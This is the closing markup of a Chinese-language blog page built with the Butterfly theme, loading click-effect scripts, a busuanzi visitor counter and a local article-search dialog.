+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="❤️,🩷,🧡,💛,💚,💙,🩵,💜,🤎,🖤,🩶,🤍" data-fontsize="15px" data-random="random" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
